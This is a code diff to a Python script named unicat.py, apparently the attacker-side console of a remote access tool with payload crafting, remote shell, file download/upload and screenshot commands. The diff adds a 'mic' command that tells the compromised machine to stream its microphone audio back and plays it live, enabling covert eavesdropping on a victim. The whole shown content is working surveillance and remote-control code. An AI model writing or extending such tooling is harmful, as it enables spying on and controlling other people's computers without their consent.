@@ -16,10 +16,11 @@ import socket
 import struct
 import sys
 import os
+import pyaudio
 
 from datetime import datetime
 
-black_list = ['clear', 'help', 'openurl', 'exec', 'screenshot']
+black_list = ['clear', 'help', 'openurl', 'exec', 'screenshot', 'mic']
 
 if len(sys.argv) != 3:
     print("Usage: unicat.py <local_host> <local_port>")
@@ -27,6 +28,10 @@ if len(sys.argv) != 3:
 
 LHOST = sys.argv[1]
 LPORT = int(sys.argv[2])
+
+def callback(in_data, frame_count, time_info, status):
+    unicorn.send(in_data)
+    return (None, pyaudio.paContinue)
 
 def craft_payload(LHOST, LPORT):
     print(G+"Sending payload...")
@@ -96,6 +101,35 @@ def screenshot(output_filename):
     f.write(image)
     f.close()
     print(S+"Saved to "+output_filename+"...")
+
+def listen_audio():
+    p = pyaudio.PyAudio()
+    CHUNK = 1024 * 4
+    FORMAT = pyaudio.paInt16
+    CHANNELS = 2
+    RATE = 44100
+    stream = p.open(format=FORMAT,
+                    channels=CHANNELS,
+                    rate=RATE,
+                    output=True,
+                    frames_per_buffer=CHUNK)
+
+    print(G+"Listening...")
+    print(I+"Press Ctrl-C to stop.")
+
+    unicorn.send("mic".encode("UTF-8"))
+    while True:
+        unicorn.send("continue".encode("UTF-8"))
+        try:
+            data = unicorn.recvall(4096)
+            stream.write(data)
+        except (KeyboardInterrupt, EOFError):
+            unicorn.send("break".encode("UTF-8"))
+            break
+
+    stream.stop_stream()
+    stream.close()
+    p.terminate()
 
 def download(input_file):
     command = input_file
@@ -178,6 +212,8 @@ def shell():
                 help()
             elif ui[0] == "download":
                 download(command)
+            elif ui[0] == "mic":
+                listen_audio()
             elif ui[0] == "upload":
                 upload(command)
             elif ui[0] == "screenshot":
